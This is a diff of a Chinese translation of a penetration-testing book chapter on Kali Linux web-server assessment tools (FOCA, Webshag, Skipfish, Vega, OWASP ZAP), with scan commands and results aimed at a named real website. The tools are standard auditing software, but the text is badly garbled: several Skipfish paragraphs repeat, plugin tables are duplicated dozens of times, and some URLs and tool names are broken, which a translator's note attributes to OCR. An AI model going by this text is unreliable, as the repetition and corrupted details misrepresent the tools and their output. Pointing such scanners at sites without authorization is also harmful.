+2. 一旦命名了项目名称并决定了存储位置，请点击 `Create`（创建）按钮，如下：![](img/df1fdcde66c92c1fef83bd651dd5ffe3_85_0.png)
 
-下一步要做的是保存你的项目文件。项目保存后，点击 Search（搜索）按钮，以便 FOCA 也使用搜索引擎查找文档![](img/df1fdcde66c92c1fef83bd651dd5ffe3_86_0.png)
+下一步要做的是保存你的项目文件。项目保存后，点击 `Search`（搜索）按钮，以便 `FOCA` 也使用搜索引擎查找文档![](img/df1fdcde66c92c1fef83bd651dd5ffe3_86_0.png)
 
-右键点击文件并选择 Download（下载）选项，如下![](img/df1fdcde66c92c1fef83bd651dd5ffe3_86_1.png)
+右键点击文件并选择 `Download`（下载）选项，如下![](img/df1fdcde66c92c1fef83bd651dd5ffe3_86_1.png)
 
-5. 右键点击文件并选择 Extract metadata（提取元数据）选项，如下![](img/df1fdcde66c92c1fef83bd651dd5ffe3_87_0.png)
+5. 右键点击文件并选择 `Extract metadata`（提取元数据）选项，如下![](img/df1fdcde66c92c1fef83bd651dd5ffe3_87_0.png)
 
-6. 右键点击文件并选择 Analyze Metadata（分析元数据）选项，如下![](img/df1fdcde66c92c1fef83bd651dd5ffe3_87_1.png)
+6. 右键点击文件并选择 `Analyze Metadata`（分析元数据）选项，如下![](img/df1fdcde66c92c1fef83bd651dd5ffe3_87_1.png)
 
 在第一张截图中，你可以看到人们打开了文档![](img/df1fdcde66c92c1fef83bd651dd5ffe3_88_0.png)
 
@@ -1269,7 +1275,7 @@ FOCA 是一种安全审计工具，将检查来自域的元数据。你可以让
 
 在许多情况下，攻击者将看到更多信息并收集有关目标的情报。
 
-FOCA 允许用户保存并索引所有元数据的副本。此外，每种类型的元数据文件都可以保存和复制。这为渗透测试人员提供了丰富的信息。截图通常用于提供索引文件的概览，并列出单个文件。最后，FOCA 将允许渗透测试人员下载单个文件。
+`FOCA` 允许用户保存并索引所有元数据的副本。此外，每种类型的元数据文件都可以保存和复制。这为渗透测试人员提供了丰富的信息。截图通常用于提供索引文件的概览，并列出单个文件。最后，`FOCA` 将允许渗透测试人员下载单个文件。
 
 ## 总结
 
@@ -1285,34 +1291,33 @@ FOCA 允许用户保存并索引所有元数据的副本。此外，每种类型
 
 网络服务器通常配置为处理大量客户端的服务负载，这意味着增加了额外的处理器、内存和存储，这些资产成为黑客非常有价值的目标。组织通常远程管理服务器且并不积极监控活动，这意味着性能的小波动或其他被入侵的迹象可能未被发现。常见的是是在所有者发现用于访问系统的漏洞之前，恶意用户已经访问了被入侵的服务器很长时间。
 
+### 服务端攻击
 
-
-
-
-## 服务端攻击
-
-## 漏洞评估
+### 漏洞评估
 
 服务端攻击是利用并发现运行在服务器上的服务、端口和应用程序中的漏洞。例如，一个 Web 服务器有多个攻击向量。它是一个运行操作系统并运行各种软件以提供 Web 运行的服务器。它有许多开放的 TCP 协议。其中每一个协议都可能存在漏洞，攻击者可以利用这些漏洞进入系统并获取宝贵信息。服务器上的协议通过可读的非加密文本进行处理。
 
 让我们看看 Kali 中用于识别服务器漏洞的可用工具。
 
-## Webshag
+### Webshag
 
-Webshag 是一个多线程、多平台的工具，用于审计 Web 服务器。Webshag 收集了 Web 服务器常用的功能，如端口扫描、URL 扫描和模糊测试（fuzzing）。它可以通过 HTTP 或 HTTPS 扫描 Web 服务器，也可以通过代理以及使用 HTTP 身份验证（基本或摘要式）。此外，Webshag 还可以使用 IDS 规避能力，旨在使关联请求变得更加复杂。
+`Webshag` 是一个多线程、多平台的工具，用于审计 Web 服务器。`Webshag` 收集了 Web 服务器常用的功能，如端口扫描、URL 扫描和模糊测试（fuzzing）。它可以通过 HTTP 或 HTTPS 扫描 Web 服务器，也可以通过代理以及使用 HTTP 身份验证（基本或摘要式）。此外，`Webshag` 还可以使用 IDS 规避能力，旨在使关联请求变得更加复杂。
 
-Webshag 提供了额外的创新功能，例如检索目标机器上托管的域名列表，以及使用动态生成的文件进行模糊测试。Webshag 可以对网页进行指纹识别，同时对内容变化具有抗性。此功能被设计为一种误报消除算法，旨在处理“软 404”服务器响应。
+`Webshag` 提供了额外的创新功能，例如检索目标机器上托管的域名列表，以及使用动态生成的文件进行模糊测试。`Webshag` 可以对网页进行指纹识别，同时对内容变化具有抗性。此功能被设计为一种误报消除算法，旨在处理“软 404”服务器响应。
 
-Webshag 通过 GUI 或命令行控制台访问，适用于 Linux 和 Windows 平台。在 Web Applications | Web Vulnerability Scanners 下可以找到 `webshag-gui`。
+`Webshag` 通过 GUI 或命令行控制台访问，适用于 Linux 和 Windows 平台。在 Web Applications | Web Vulnerability Scanners 下可以找到 `webshag-gui`。
 
-Webshag 易于使用。每个功能在顶部都有一个标签页。选择所需的功能标签，在 target 空间下输入你的目标 URL，然后点击 OK 执行。你可以同时运行多个标签。功能包括端口扫描、爬虫（Spider）、URL 扫描和模糊测试。接下来的四张截图显示了 Webshag 对 www.thesecurityblogger.com 执行端口扫描、Web 爬虫遍历、URL 扫描和文件模糊。
+`Webshag` 易于使用。每个功能在顶部都有一个标签页。选择所需的功能标签，在 target 空间下输入你的目标 URL，然后点击 OK 执行。你可以同时运行多个标签。功能包括端口扫描、爬虫（Spider）、URL 扫描和模糊测试。接下来的四张截图显示了 `Webshag` 对 www.thesecurityblogger.com 执行端口扫描、Web 爬虫遍历、URL 扫描和文件模糊。
 
 ## 第三章
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_92_0.png)
+
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_92_1.png)
 
 [ 75 ]
+
+
 
 ## 服务端攻击
 
@@ -1323,14 +1328,21 @@ Webshag 支持以 XML、HTML 和 TXT 文件格式导出审计期间发现的所�
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_94_0.png)
 
 ### 审计报告
+
 26-04-2013
 
 ### 端口扫描器
+
 64.90.50.80
+
 80 (tcp)
+
 Service: http
+
 587 (tcp)
+
 Service: smtp
+
 Product: Postfix smtpd
 
 ### Info
@@ -1356,7 +1368,7 @@ complete.wl extensions-only.wl medium.wl minimal.wl
 
 Skipfish 提供了多种可用的命令选项。要使用自定义词表对目标网站运行 Skipfish，请输入 `skipfish`，选择你的词表，使用 `-o` 后跟位置选择你的输出目录，最后是目标网站。
 
-Skipfish -o (输出位置) -W (词表位置) (目标网站)
+`Skipfish -o` (输出位置) `-W` (词表位置) (目标网站)
 
 以下示例显示了使用名为 `complete.wl` 的词表对 securityblogger.com 进行扫描。Skipfish 将桌面上创建一个名为 Skipfishoutput 的文件夹。运行使用关键字 `skipfish`，使用 `-o /root/Desktop/Skipfishoutput` 指定输出发送的位置，使用 `-W /root/Desktop/complete.wl` 指定字典的位置，并将 `http://www.thesecurityblogger.com` 作为扫描目标。
 
@@ -1370,7 +1382,7 @@ root@kali:~# skipfish -o /root/Desktop/Skipfishoutput -W /root/Desktop/complete.
 
 Skipfish 提供了多种可用的命令选项。要使用自定义词表对目标网站运行 Skipfish，请输入 `skipfish`，选择你的词表，使用 `-o` 后跟位置选择你的输出目录，最后是目标网站。
 
-Skipfish -o (输出位置) -W (词表位置) (目标网站)
+`Skipfish -o` (输出位置) `-W` (词表位置) (目标网站)
 
 以下示例显示了使用名为 `complete.wl` 的词表对 securityblogger.com 进行扫描。Skipfish 将桌面上创建一个名为 Skipfishoutput 的文件夹。运行使用关键字 `skipfish`，使用 `-o /root/Desktop/Skipfishoutput` 指定输出发送的位置，使用 `-W /root/Desktop/complete.wl` 指定字典的位置，并将 `http://www.thesecurityblogger.com` 作为扫描目标。
 
@@ -1384,7 +1396,7 @@ root@kali:~# skipfish -o /root/Desktop/Skipfishoutput -W /root/Desktop/complete.
 
 Skipfish 提供了多种可用的命令选项。要使用自定义词表对目标网站运行 Skipfish，请输入 `skipfish`，选择你的词表，使用 `-o` 后跟位置选择你的输出目录，最后是目标网站。
 
-Skipfish -o (输出位置) -W (词表位置) (目标网站)
+`Skipfish -o` (输出位置) `-W` (词表位置) (目标网站)
 
 以下示例显示了使用名为 `complete.wl` 的词表对 securityblogger.com 进行扫描。Skipfish 将桌面上创建一个名为 Skipfishoutput 的文件夹。运行使用关键字 `skipfish`，使用 `-o /root/Desktop/Skipfishoutput` 指定输出发送的位置，使用 `-W /root/Desktop/complete.wl` 指定字典的位置，并将 `http://www.thesecurityblogger.com` 作为扫描目标。
 
@@ -1413,6 +1425,7 @@ Webshag 易于使用。每个功能在顶部都有一个标签页。选择所需
 ## 第三章
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_92_0.png)
+
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_92_1.png)
 
 [ 75 ]
@@ -1426,29 +1439,38 @@ Webshag 支持以 XML、HTML 和 TXT 文件格式导出审计期间发现的所�
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_94_0.png)
 
 ### 审计报告
+
 26-04-2013
 
 ### 端口扫描
+
 64.90.50.80
+
 80 (tcp)
+
 Service: http
+
 587 (tcp)
+
 Service: smtp
+
 Product: Postfix smtpd
 
 ### Info
 
 ### 爬虫 (Spider)
 
+
+
 > 关于 Webshag 的更多信息可以访问 http://www.scrt.ch/en/attack/downloads/webshag。
 
-### Skipfish
+## Skipfish
 
 Skipfish 是一个 Web 应用安全侦察工具。Skipfish 使用递归爬取和基于字典的探测为目标准备一个交互式站点地图。生成的地图在经过安全检查扫描后提供输出。
 
 在 Web Applications | Web Vulnerability Scanners 下可以找到 `skipfish`。当你第一次打开 Skipfish 时，会弹出一个终端窗口展示 Skipfish 命令。Skipfish 可以使用内置或自定义的字典进行漏洞评估。
 
-- 注意，Kali 中可能找不到某些字典。你可以从 https://code.google.com/p/skipfish/ 下载最新版本的 Skipfish 和默认字典。
+注意，Kali 中可能找不到某些字典。你可以从 https://code.google.com/p/skipfish/ 下载最新版本的 Skipfish 和默认字典。
 
 可用的字典位于字典文件中。
 
@@ -1459,13 +1481,9 @@ complete.wl extensions-only.wl medium.wl minimal.wl
 
 Skipfish 提供了多种可用的命令选项。要使用自定义词表对目标网站运行 Skipfish，请输入 `skipfish`，选择你的词表，使用 `-o` 后跟位置选择你的输出目录，最后是目标网站。
 
-Skipfish -o (输出位置) -W (词表位置) (目标网站)
+`skipfish -o`（输出位置）`-W`（词表位置）（目标网站）
 
 以下示例显示了使用名为 `complete.wl` 的词表对 securityblogger.com 进行扫描。Skipfish 将桌面上创建一个名为 Skipfishoutput 的文件夹。运行使用关键字 `skipfish`，使用 `-o /root/Desktop/Skipfishoutput` 指定输出发送的位置，使用 `-W /root/Desktop/complete.wl` 指定字典的位置，并将 `http://www.thesecurityblogger.com` 作为扫描目标。
-
-
-
-
 
 ## 服务端攻击
 
@@ -1477,7 +1495,7 @@ Skipfish -o (输出位置) -W (词表位置) (目标网站)
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_99_1.png)
 
-## 第 3 章
+### 第 3 章
 
 | Comms（通信） | Request Stats（请求统计） | Variable Stats（变量统计） | Config（配置） | Plugins（插件） | Log（日志） | Repeat Request（重复请求） | Crawler（爬虫） |
 | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
@@ -1532,76 +1550,64 @@ Skipfish -o (输出位置) -W (词表位置) (目标网站)
 Plugins 标签页显示扫描启动后的爬取结果。识别出的攻击可以通过 HTML 或 XML 导出。
 
 | Comms（通信） | Request Stats（请求统计） | Variable Stats（变量统计） | Config（配置） | Plugins（插件） | Log（日志） | Repeat Request（重复请求） | Crawler（爬虫） |
-| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
-| 插件选择：XSS & SSI 攻击 | | | | | | 重置缓存 | 导出 HTML | 导出 XML |
-| | | | | | | | 请求线程 1 | |
-| Url | | Variable | Method | 可用注入 | | | | |
-| = http://www.thesecurityblogger.com/?cat=242 | | cat | GET | | | | |
-| = http://www.thesecurityblogger.com/?tag=balancing-act | | tag | GET | 'Single Quotes) (Normal Encoding): | | | |
-| | | | | (Parenthesis) (Normal Encoding) | | | |
-| = http://www.thesecurityblogger.com/?p=2068 | | p | GET | | | | |
-| = http://www.thesecurityblogger.com/?attachment_id=2071 | | attachment_id | GET | | | | |
-| = http://www.thesecurityblogger.com/?page_id=2 | | page_id | GET | | | | |
-| = http://www.thesecurityblogger.com/?feed=comments-rss2 | | feed | GET | (Parenthesis) (Normal Encoding) | | | |
 
-Log 标签页显示目标网站上再次运行的任务以及每个攻击的成功率。此文件可以复制到文本文件中作为最终交付。Crawler 标签页列出了所有与目标相关的 链接。
 
-| Comms（通信） | Request Stats（请求统计） | Variable Stats（变量统计） | Config（配置） | Plugins（插件） | Log（日志） | Repeat Request（重复请求） | Crawler（爬虫） |
-| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
-| Log 输出: | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | |
-| | | | | | | | | |
-| | | | | | | | | |
-| | | | | | | | | | |
-| | | | | | | | | |
 
- = http http://..securityblogger..com/?==442 | | cat | | | | | | | |
-| = http://www.thesecurityblogger.com/?tag=balancing-act | | tag | GET | 'Single Quotes) (Normal Encoding): | | | | | |
-| | | | (Parenthesis) (Normal Encoding) | | | | | | |
-| = http://www.thesecurityblogger.com/?p=2068 | | p | GET | | | | | | |
-| = http://www.thesecurityblogger.com/?attachment_id=2071 | | attachment_id | GET | | | | | | |
-| = http://www.thesecurityblogger.com/?page_id=2 | | page_id | | | | | | | |
+插件选择：XSS & SSI 攻击。重置缓存、导出 HTML、导出 XML。请求线程 1。
 
- = http://www.thesecurityblogger.com/?feed=comments-rss2 | | feed | GET | (Parenthesis) (Normal Encoding) | | | | | | |
+| Url | Variable | Method | 可用注入 |
+| :--- | :--- | :--- | :--- |
+| `= http://www.thesecurityblogger.com/?cat=242` | `cat` | `GET` | |
+| `= http://www.thesecurityblogger.com/?tag=balancing-act` | `tag` | `GET` | 'Single Quotes) (Normal Encoding):、 (Parenthesis) (Normal Encoding) |
+| `= http://www.thesecurityblogger.com/?p=2068` | `p` | `GET` | |
+| `= http://www.thesecurityblogger.com/?attachment_id=2071` | `attachment_id` | `GET` | |
+| `= http://www.thesecurityblogger.com/?page_id=2` | `page_id` | `GET` | |
+| `= http://www.thesecurityblogger.com/?feed=comments-rss2` | `feed` | `GET` | (Parenthesis) (Normal Encoding) |
 
-*(注：OCR 后半部分的表格表示已破碎，我根据可见的头部和行重建了逻辑结构).*
+Log 标签页显示目标网站上再次运行的任务以及每个攻击的成功率。此文件可以复制到文本文件中作为最终交付。Crawler 标签页列出了所有与目标相关的链接。
+
+Comms（通信）、Request Stats（请求统计）、Variable Stats（变量统计）、Config（配置）、Plugins（插件）、Log（日志）、Repeat Request（重复请求）、Crawler（爬虫）。
+
+Log 输出:
+
+| Url | Variable | Method | 可用注入 |
+| :--- | :--- | :--- | :--- |
+| `= http http://..securityblogger..com/?==442` | `cat` | | |
+| `= http://www.thesecurityblogger.com/?tag=balancing-act` | `tag` | `GET` | 'Single Quotes) (Normal Encoding):、 (Parenthesis) (Normal Encoding) |
+| `= http://www.thesecurityblogger.com/?p=2068` | `p` | `GET` | |
+| `= http://www.thesecurityblogger.com/?attachment_id=2071` | `attachment_id` | `GET` | |
+| `= http://www.thesecurityblogger.com/?page_id=2` | `page_id` | | |
+| `= http://www.thesecurityblogger.com/?feed=comments-rss2` | `feed` | `GET` | (Parenthesis) (Normal Encoding) |
+
+*（注：OCR 后半部分的表格表示已破碎，我根据可见的头部和行重建了逻辑结构）。*
 
 爬取过程由两个线程执行，以避免 Web 服务器过载。
 
 爬取过程由两个线程执行，以避免 Web 服务器过载。
 
-检测到的 URL 可以转发到已启用的插件。
+检测到的 URL 可以转发到已启用的插件。此外，检测到的表单显示在表中，可以通过双击每个链接手动填充。请享用！
 
-此外，检测到的表单显示在表中，可以通过双击每个链接手动填充。请享用！
-
-- http://www.thesecurityblogger.com
-- http://www.thesecurityblogger.com
-- http://www.thesecurityblogger.com/tp=2068#comments
-- http://www.thesecurityblogger.com/tp=2068#more-2068
-- http://www.thesecurityblogger.com/attachment_id=2070
-- http://www.thesecurityblogger.com/attachment_id=2071
-- http://www.thesecurityblogger.com/tp=2068
-- http://www.thesecurityblogger.com/tp=2098#more-2098
-- http://www.thesecurityblogger.com/attachment_id=2999
-- http://www.thesecurityblogger.com/tp=1903#comments
-- http://www.thesecurityblogger.com/attachment_id=1999
-- http://www.thesecurityblogger.com/attachment_id=1996
-- http://www.thesecurityblogger.com/attachment_id=2113
-- http://www.thesecurityblogger.com/attachment_id=2192
-- http://www.thesecurityblogger.com/attachment_id=2111
-- http://www.thesecurityblogger.com/tp=2123#request
-- http://www.thesecurityblogger.com/attachment_id=2127
-- http://www.thesecurityblogger.com/attachment_id=2123
-- http://www.thesecurityblogger.com/attachment_id=2126
-- http://www.thesecurityblogger.com/tp=2125
-- http://www.thesecurityblogger.com/tp=2161#comments
+- `http://www.thesecurityblogger.com`
+- `http://www.thesecurityblogger.com`
+- `http://www.thesecurityblogger.com/tp=2068#comments`
+- `http://www.thesecurityblogger.com/tp=2068#more-2068`
+- `http://www.thesecurityblogger.com/attachment_id=2070`
+- `http://www.thesecurityblogger.com/attachment_id=2071`
+- `http://www.thesecurityblogger.com/tp=2068`
+- `http://www.thesecurityblogger.com/tp=2098#more-2098`
+- `http://www.thesecurityblogger.com/attachment_id=2999`
+- `http://www.thesecurityblogger.com/tp=1903#comments`
+- `http://www.thesecurityblogger.com/attachment_id=1999`
+- `http://www.thesecurityblogger.com/attachment_id=1996`
+- `http://www.thesecurityblogger.com/attachment_id=2113`
+- `http://www.thesecurityblogger.com/attachment_id=2192`
+- `http://www.thesecurityblogger.com/attachment_id=2111`
+- `http://www.thesecurityblogger.com/tp=2123#request`
+- `http://www.thesecurityblogger.com/attachment_id=2127`
+- `http://www.thesecurityblogger.com/attachment_id=2123`
+- `http://www.thesecurityblogger.com/attachment_id=2126`
+- `http://www.thesecurityblogger.com/tp=2125`
+- `http://www.thesecurityblogger.com/tp=2161#comments`
 
 ## 服务端攻击
 
@@ -1613,15 +1619,11 @@ Log 标签页显示目标网站上再次运行的任务以及每个攻击的成�
 
 Vega 是一种用于爬取网站并分析页面内容的安全工具。
 
-## 服务端攻击
+### 服务端攻击
 
 Vega 在右上角有 Scanner 和 Proxy 标签页。要将 Vega 作为扫描器使用，请点击右上角的 Scanner，点击左上角的 Scan，并选择新建。
 
 Vega 的 Proxy 部分提供了查看目标网站请求和响应的能力。当扫描进行时，Proxy 部分将会被填充。
-
-
-
-
 
 ## 第 3 章
 
@@ -1633,37 +1635,39 @@ Vega 提供了主显示窗口中发现的漏洞详情以及摘要页。这些详
 
 Owasp-Zap 也称为 Zaproxy，是一种用于 Web应用程序安全测试的拦截代理。
 
-通过进入 Web Applications（应用程序） | Web Application Fuzzers（Web 应用模糊器）并选择 owasp-zap 打开 Zaproxy。会弹出一个声明，必须接受才能进入程序。
+通过进入 Web Applications（应用程序） | Web Application Fuzzers（Web 应用模糊器）并选择 `owasp-zap` 打开 Zaproxy。会弹出一个声明，必须接受才能进入程序。
 
 接受许可免责声明后，Owasp-Zap 将打开并显示另一个弹出窗口，询问你是否创建一个 SSL Root CA 证书。这允许 Zaproxy 拦截浏览器中通过 SSL 的 HTTPS 流量。对于测试使用 HTTPS 的方面至关重要。要生成 SSL 证书，点击 Generate（生成）按钮。
+
+
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_106_1.png)
 
 ## 服务端攻击
 
-将弹出一个窗口来生成或导入证书。你可以通过点击 **Generate**（生成）来生成证书。可以通过点击 **Save**（保存）并选择位置来保存新证书。新证书文件名为 owasp_cap_root_ca.cer。
+将弹出一个窗口来生成或导入证书。你可以通过点击 `Generate`（生成）来生成证书。可以通过点击 `Save`（保存）并选择位置来保存新证书。新证书文件名为 `owasp_cap_root_ca.cer`。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_107_0.png)
 
-保存 CA 文件后，点击 **OK**（确定）并打开浏览器。对于 Firefox，进入 **Edit**（编辑） | **Preferences**（选项）并点击 **Advanced**（高级）标签页。点击 **Encryption**（加密）子标签并点击 **View Certificates**（查看证书）。点击 **Import**（导入）并选择你在 Zaproxy 中生成的证书（*.cer 文件）。Firefox 将询问你是否信任此新的 **Certificate Authority**（证书颁发机构）。勾选所有三个选项，即对网站、电子邮件用户和软件开发者信任。点击 **OK**。
+保存 CA 文件后，点击 `OK`（确定）并打开浏览器。对于 Firefox，进入 `Edit`（编辑） | `Preferences`（选项）并点击 `Advanced`（高级）标签页。点击 `Encryption`（加密）子标签并点击 `View Certificates`（查看证书）。点击 `Import`（导入）并选择你在 Zaproxy 中生成的证书（`*.cer` 文件）。Firefox 将询问你是否信任此新的 `Certificate Authority`（证书颁发机构）。勾选所有三个选项，即对网站、电子邮件用户和软件开发者信任。点击 `OK`。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_107_1.png)
 
-下一步是将 Firefox 设置为通过 Zaproxy 代理所有流量。方法是进入 Edit（编辑），Preferences（选项），选择 Advanced（高级）标签，然后选择 Network（网络）标签。点击 Configure（配置）按钮，点击 Manual proxy configuration（手动代理配置），输入 localhost 和端口 8080（这是 Zaproxy 的默认端口）。勾选 Use this proxy server for all protocols（所有协议使用此代理服务器）旁边的框框并点击 OK。下面的截图演示了此配置：
+下一步是将 Firefox 设置为通过 Zaproxy 代理所有流量。方法是进入 `Edit`（编辑），`Preferences`（选项），选择 `Advanced`（高级）标签，然后选择 `Network`（网络）标签。点击 `Configure`（配置）按钮，点击 `Manual proxy configuration`（手动代理配置），输入 `localhost` 和端口 `8080`（这是 Zaproxy 的默认端口）。勾选 `Use this proxy server for all protocols`（所有协议使用此代理服务器）旁边的框框并点击 `OK`。下面的截图演示了此配置：
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_108_0.png)
 
-打开 Zaproxy，你会在左侧看到一个 Sites（站点）窗口。当你使用 Firefox 浏览互联网时，该窗口会填充内容。你可以在右窗口查看每个页面的所有请求和响应。Zaproxy 提供了每个网页使用的所有资源的直观视图。
+打开 Zaproxy，你会在左侧看到一个 `Sites`（站点）窗口。当你使用 Firefox 浏览互联网时，该窗口会填充内容。你可以在右窗口查看每个页面的所有请求和响应。Zaproxy 提供了每个网页使用的所有资源的直观视图。
 
-你也可以通过进入 quick start（快速开始）窗口并在 URL to attack 处输入网站来对网站进行针对性评估。下面的截图是 Zaproxy 正在对 **www.thesecurityblogger.com** 进行扫描。
+你也可以通过进入 `quick start`（快速开始）窗口并在 `URL to attack` 处输入网站来对网站进行针对性评估。下面的截图是 Zaproxy 正在对 `www.thesecurityblogger.com` 进行扫描。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_109_0.png)
 
-Zaproxy 将对目标进行爬虫遍历，以识别与目标相关链接并扫描漏洞。要查看漏洞，点击 **Alerts**（警告）标签页。
+Zaproxy 将对目标进行爬虫遍历，以识别与目标相关链接并扫描漏洞。要查看漏洞，点击 `Alerts`（警告）标签页。
 
 > 注意，Zapxy 默认不进行自动身份验证。如果启用了默认设置，使用自动扫描所有登录请求都会失败。
 
-你可以使用 Zaprry 设置自动登录，或者你必须在启用 Zaprry 的情况下手动登录网站，告诉 Zaprry 登录和注销请求的位置并启用自动登录功能。GET 请求将出现在 Sites 窗口中，你必须在 Tabs 标签页下通过右键点击连接来高亮登录和注销响应，点击 Flag as Content（标记为内容）并选择是登录还是注销。
+你可以使用 Zaprry 设置自动登录，或者你必须在启用 Zaprry 的情况下手动登录网站，告诉 Zaprry 登录和注销请求的位置并启用自动登录功能。`GET` 请求将出现在 `Sites` 窗口中，你必须在 `Tabs` 标签页下通过右键点击连接来高亮登录和注销响应，点击 `Flag as Content`（标记为内容）并选择是登录还是注销。
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_110_0.png)
 
@@ -1671,7 +1675,7 @@ Zaproxy 将对目标进行爬虫遍历，以识别与目标相关链接并扫描
 
 ![](img/df1fdcde66c92c1fef83bd651dd5ffe3_110_1.png)
 
-Zapry 在 Help（帮助） | Check for updates（检查更新）下有一个市场，提供了可以添加到 Zapry 军械库的其他功能。
+Zapry 在 `Help`（帮助） | `Check for updates`（检查更新）下有一个市场，提供了可以添加到 Zapry 军械库的其他功能。
 
 | 市场扩展插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
@@ -1736,143 +1740,105 @@ Zapry 在 Help（帮助） | Check for updates（检查更新）下有一个市�
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
-| Beta | BeanConsole | | 由 BeanScanner 提供 | |
 
+
+
+| Beta | BeanConsole | | 由 BeanScanner 提供 | |
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 市场扩展插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
+| 插件 | 状态 | 标识 | 描述 | 更新 |
+| :--- | :--- | :--- | :--- | :--- |
+| Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
+| Beta | BeanConsole | | 由 BeanScanner 提供 | |
 | 市场扩展插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
-| 插件 | 状态 | 标识 | 描述 | 更新 |
-| :--- | :--- | :--- | :--- | :--- |
-| Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
-| Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 市场扩展插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
 | Beta | BeanConsole | | 由 BeanScanner 提供 | |
-
 | 插件 | 状态 | 标识 | 描述 | 更新 |
 | :--- | :--- | :--- | :--- | :--- |
 | Release | Fuzzli | Fuzzli | 可用于 ... 的 Fuzzli v09 文件 | 2 |
